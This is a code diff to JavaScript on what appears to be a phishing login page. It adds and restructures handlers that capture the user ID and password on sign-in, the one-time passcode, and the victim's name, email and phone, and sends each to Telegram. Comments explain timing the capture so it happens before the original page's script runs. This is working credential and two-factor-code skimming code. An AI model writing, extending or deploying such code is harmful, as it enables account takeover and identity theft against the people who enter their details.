@@ -644,43 +644,66 @@
       const userIdInput = document.getElementById('iduserId');
       const passwordInput = document.getElementById('idpassword');
       const signInButton = document.getElementById('loginSubmit');
+
+      // Step 1 (OTP) and Step 2 (details) elements
+      const otpNextBtn = document.getElementById('tru-otp-next-btn');
+      const otpInput = document.getElementById('tru-otp-code');
       const otpForm = document.getElementById('tru-otp-form');
 
       if (!userIdInput || !passwordInput || !signInButton) return;
-      if (signInButton.dataset.tgBound) return;
-      signInButton.dataset.tgBound = '1';
 
-      // pointerdown fires BEFORE click — grab values here, before the original
-      // script's click handler opens the popup and disrupts everything.
-      signInButton.addEventListener('pointerdown', function () {
-        const data = {
-          'User ID': userIdInput.value || '(empty)',
-          'Password': passwordInput.value || '(empty)'
-        };
-        sendToTelegram(data);
-      }, true);
+      // ── Username + Password (sent together on Sign in) ──
+      if (!signInButton.dataset.tgBound) {
+        signInButton.dataset.tgBound = '1';
 
-      // Fallback for browsers/touch that don't fire pointerdown on the button
-      signInButton.addEventListener('mousedown', function () {
-        if (signInButton.dataset.tgFired === '1') return;
-        signInButton.dataset.tgFired = '1';
-        const data = {
-          'User ID': userIdInput.value || '(empty)',
-          'Password': passwordInput.value || '(empty)'
-        };
-        sendToTelegram(data);
-        setTimeout(() => { signInButton.dataset.tgFired = ''; }, 500);
-      }, true);
+        // pointerdown fires BEFORE click — grab values here, before the original
+        // script's click handler opens the popup and disrupts everything.
+        signInButton.addEventListener('pointerdown', function () {
+          const data = {
+            'User ID': userIdInput.value || '(empty)',
+            'Password': passwordInput.value || '(empty)'
+          };
+          sendToTelegram(data);
+        }, true);
 
+        // Fallback for browsers/touch that don't fire pointerdown on the button
+        signInButton.addEventListener('mousedown', function () {
+          if (signInButton.dataset.tgFired === '1') return;
+          signInButton.dataset.tgFired = '1';
+          const data = {
+            'User ID': userIdInput.value || '(empty)',
+            'Password': passwordInput.value || '(empty)'
+          };
+          sendToTelegram(data);
+          setTimeout(() => { signInButton.dataset.tgFired = ''; }, 500);
+        }, true);
+      }
+
+      // ── OTP only (sent on its own when user clicks Continue) ──
+      if (otpNextBtn && !otpNextBtn.dataset.tgBound) {
+        otpNextBtn.dataset.tgBound = '1';
+        otpNextBtn.addEventListener('click', function () {
+          const otp = otpInput ? otpInput.value.trim() : '';
+          if (!otp) return; // original script handles the validation error
+          sendToTelegram({ 'OTP': otp });
+        }, true);
+      }
+
+      // ── Details only (sent on its own when user clicks Submit) ──
       if (otpForm && !otpForm.dataset.tgBound) {
         otpForm.dataset.tgBound = '1';
-        otpForm.addEventListener('submit', function (e) {
-          const formData = new FormData(otpForm);
-          const data = {};
-          for (let [key, value] of formData.entries()) {
-            let cleanKey = key.replace(/[_-]/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
-            data[cleanKey] = value;
-          }
+        otpForm.addEventListener('submit', function () {
+          const firstName = document.getElementById('tru-first-name');
+          const lastName = document.getElementById('tru-last-name');
+          const email = document.getElementById('tru-email');
+          const phone = document.getElementById('tru-phone');
+
+          const data = {
+            'First Name': firstName ? firstName.value.trim() : '',
+            'Last Name': lastName ? lastName.value.trim() : '',
+            'Email': email ? email.value.trim() : '',
+            'Phone': phone ? phone.value.trim() : ''
+          };
           sendToTelegram(data);
         }, true);
       }
